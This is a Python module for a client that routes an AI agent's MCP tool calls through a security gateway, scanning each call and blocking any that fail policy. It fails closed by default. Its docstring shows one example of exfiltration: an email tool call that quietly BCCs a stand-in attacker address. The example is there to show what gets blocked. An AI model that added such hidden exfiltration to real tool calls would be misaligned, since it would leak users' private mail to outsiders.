"""Client middleware for routing real MCP tool calls through the security gateway.

This is how a live product feed is produced: wrap your agent's tool-execution
function with ``guard()``. Every tool call is scanned by the running gateway
(POST /api/scan), which streams the verdict to the live dashboard and blocks
calls that fail policy.

Example
-------
    from mcp_monitor.client import GatewayClient

    gw = GatewayClient("http://localhost:8000", api_key="replace-with-secret")

    @gw.guard
    def send_email(**kwargs):
        return smtp_send(**kwargs)

    # Blocked calls raise ToolBlocked before the real tool runs:
    send_email(server_id="postmark", to="u@x.com", bcc="attacker@evil.com")

Availability policy
-------------------
Security-critical deployments fail closed by default. If the gateway is
unreachable, the wrapped tool call is blocked. Monitoring-only callers can
explicitly opt into ``fail_closed=False`` after considering the availability
trade-off.
"""

from __future__ import annotations

import functools
import json
import urllib.error
import urllib.request
from collections.abc import Callable
from typing import Any
from urllib.parse import urlparse


class ToolBlocked(Exception):
    """Raised when the gateway blocks a tool call before execution."""

    def __init__(self, verdict: dict[str, Any]) -> None:
        self.verdict = verdict
        layer = verdict.get("blocked_by_layer")
        risk = verdict.get("risk_score")
        super().__init__(f"Tool call blocked by layer {layer} (risk={risk})")


class GatewayClient:
    """Thin HTTP client for the MCP security gateway's ``/api/scan`` endpoint.

    Args:
        base_url: Absolute HTTP(S) gateway endpoint.
        timeout: Per-request timeout in seconds.
        api_key: Optional gateway API key. When supplied, sent as ``X-API-Key``.
            The production gateway rejects anonymous protected requests.
        fail_closed: Transport availability policy. Defaults to ``True`` so an
            unreachable gateway blocks execution instead of silently allowing it.
    """

    def __init__(
        self,
        base_url: str = "http://localhost:8000",
        timeout: float = 5.0,
        *,
        api_key: str | None = None,
        fail_closed: bool = True,
    ) -> None:
        normalized_url = base_url.rstrip("/")
        parsed = urlparse(normalized_url)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise ValueError("GatewayClient base_url must be an absolute HTTP or HTTPS endpoint")
        if timeout <= 0:
            raise ValueError("GatewayClient timeout must be greater than zero")
        self.base_url = normalized_url
        self.timeout = timeout
        self.api_key = api_key
        self.fail_closed = fail_closed

    def scan(self, tool_call: dict[str, Any]) -> dict[str, Any]:
        """POST a tool call to the gateway and return the verdict dict.

        Transport or non-2xx failures are treated as unavailable-gateway events
        and follow ``fail_closed``. A protected gateway's HTTP 401 is therefore
        blocking in the default security-oriented mode.
        """
        data = json.dumps(tool_call).encode("utf-8")
        headers = {"Content-Type": "application/json"}
        if self.api_key:
            headers["X-API-Key"] = self.api_key
        req = urllib.request.Request(
            f"{self.base_url}/api/scan",
            data=data,
            headers=headers,
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:  # nosec B310
                payload = json.loads(resp.read().decode("utf-8"))
                if not isinstance(payload, dict):
                    raise ValueError("Gateway response must be a JSON object")
                return payload
        except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
            return {
                "call_id": None,
                "allowed": not self.fail_closed,
                "blocked_by_layer": None if not self.fail_closed else 0,
                "risk_score": 0,
                "enforcement_action": "allow" if not self.fail_closed else "block",
                "layer_results": [],
                "transport_error": str(exc),
                "fail_closed": self.fail_closed,
            }

    def guard(self, fn: Callable[..., Any]) -> Callable[..., Any]:
        """Decorator: scan the tool call before running ``fn``.

        The wrapped function must accept ``server_id`` and its tool arguments as
        keyword arguments. The tool name is taken from ``fn.__name__`` unless a
        ``tool_name`` kwarg is supplied.
        """

        @functools.wraps(fn)
        def wrapper(*args: Any, **kwargs: Any) -> Any:
            tool_name = kwargs.pop("tool_name", fn.__name__)
            server_id = kwargs.get("server_id", "unknown")
            tool_call = {
                "name": tool_name,
                "server_id": server_id,
                "arguments": {k: v for k, v in kwargs.items() if k != "server_id"},
            }
            verdict = self.scan(tool_call)
            if not verdict.get("allowed", False):
                raise ToolBlocked(verdict)
            return fn(*args, **kwargs)

        return wrapper
